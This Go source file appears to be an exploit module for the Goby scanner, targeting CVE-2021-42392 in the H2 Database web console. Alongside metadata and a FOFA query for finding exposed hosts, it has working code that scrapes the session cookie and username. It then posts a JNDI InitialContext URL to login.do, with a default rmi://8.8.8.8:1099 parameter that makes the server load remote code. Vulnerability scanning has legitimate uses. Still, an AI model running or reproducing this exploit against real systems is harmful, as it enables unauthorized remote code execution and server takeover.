package exploits

import (
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "H2 Database Console login.do Code Execution Vulnerability (CVE-2021-42392)",
    "Description": "<p>H2 database is a Java memory database, which is mainly used for unit testing.</p><p>There is an unauthorized remote code execution vulnerability in the H2 Database Web management page. An attacker can use this vulnerability to arbitrarily execute code on the server side, write to the back door, and obtain server permissions, thereby controlling the entire web server.</p>",
    "Product": "H2-Database",
    "Homepage": "http://www.h2database.com/",
    "DisclosureDate": "2022-12-19",
    "Author": "heiyeleng",
    "FofaQuery": "body=\"login.jsp?jsessionid=\" && body=\"Welcome to H2\"",
    "GobyQuery": "body=\"login.jsp?jsessionid=\" && body=\"Welcome to H2\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The manufacturer has provided vulnerability repair suggestions, please follow the manufacturer's homepage to update it in time: <a href=\"https://github.com/h2database/h2database/releases/tag/version-2.0.206\">https://github.com/h2database/h2database/releases/tag/version-2.0.206</a>.</p>",
    "References": [
        "https://fofa.info"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "rmi://8.8.8.8:1099/xxx",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2021-42392"
    ],
    "CNNVD": [
        "CNNVD-202201-572"
    ],
    "CNVD": [
        "CNVD-2022-09868"
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "H2 Database 数据库 login.do 文件远程代码执行漏洞 (CVE-2021-42392)",
            "Product": "H2-Database",
            "Description": "<p>H2 database是一款Java内存数据库，多用于单元测试。<br></p><p>H2-Database Web管理页面存在未授权远程代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>厂商已发布漏洞修复建议，请关注厂商主页及时更新：<a href=\"https://github.com/h2database/h2database/releases/tag/version-2.0.206\" target=\"_blank\">https://github.com/h2database/h2database/releases/tag/version-2.0.206</a>。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "H2 Database Console login.do Code Execution Vulnerability (CVE-2021-42392)",
            "Product": "H2-Database",
            "Description": "<p>H2 database is a Java memory database, which is mainly used for unit testing.</p><p>There is an unauthorized remote code execution vulnerability in the H2 Database Web management page. An attacker can use this vulnerability to arbitrarily execute code on the server side, write to the back door, and obtain server permissions, thereby controlling the entire web server.</p>",
            "Recommendation": "<p>The manufacturer has provided vulnerability repair suggestions, please follow the manufacturer's homepage to update it in time: <a href=\"https://github.com/h2database/h2database/releases/tag/version-2.0.206\" target=\"_blank\">https://github.com/h2database/h2database/releases/tag/version-2.0.206</a>.<br></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10706"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewGetRequestConfig("/login.jsp")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "location.href") {
					cookie := regexp.MustCompile(`'login\.jsp\?jsessionid=(.*)'`).FindStringSubmatch(resp.Utf8Html)[1]
					cfg1 := httpclient.NewGetRequestConfig("/login.jsp?jsessionid="+cookie+"")
					cfg1.VerifyTls = false
					cfg1.FollowRedirect = false
					if resp, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
						if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "name=\"user\" value=\"") {
							user := regexp.MustCompile(`name="user" value="(.*)" style`).FindStringSubmatch(resp.Utf8Html)[1]
							cfg2 := httpclient.NewPostRequestConfig("/login.do?jsessionid="+cookie+"")
							cfg2.VerifyTls = false
							cfg2.FollowRedirect = false
							cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
							checkStr := goutils.RandomHexString(4)
							checkUrl, _ := godclient.GetGodLDAPCheckURL("U", checkStr)
							cfg2.Data = "language=en&setting=Generic+H2+%28Embedded%29&name=Generic+H2+%28Embedded%29&driver=javax.naming.InitialContext&url="+checkUrl+"&user="+user+"&password="
							if resp, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
								if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "HY000") {
									return godclient.PullExists(checkStr, time.Second*15)
								}
							}
						}
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cfg := httpclient.NewGetRequestConfig("/login.jsp")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "location.href") {
					cookie := regexp.MustCompile(`'login\.jsp\?jsessionid=(.*)'`).FindStringSubmatch(resp.Utf8Html)[1]
					cfg1 := httpclient.NewGetRequestConfig("/login.jsp?jsessionid="+cookie+"")
					cfg1.VerifyTls = false
					cfg1.FollowRedirect = false
					if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
						if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "name=\"user\" value=\"") {
							user := regexp.MustCompile(`name="user" value="(.*)" style`).FindStringSubmatch(resp.Utf8Html)[1]
							cfg2 := httpclient.NewPostRequestConfig("/login.do?jsessionid="+cookie+"")
							cfg2.VerifyTls = false
							cfg2.FollowRedirect = false
							cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
							cmd := ss.Params["cmd"].(string)   //  rmi://8.8.8.8:1099/rzv7rv
							cfg2.Data = "language=en&setting=Generic+H2+%28Embedded%29&name=Generic+H2+%28Embedded%29&driver=javax.naming.InitialContext&url="+cmd+"&user="+user+"&password="
							if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
								if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "HY000") {
									expResult.Output = "请查看rmi执行命令后的结果"
									expResult.Success = true
								}
							}
						}
					}
				}
			}
			return expResult
		},
	))
}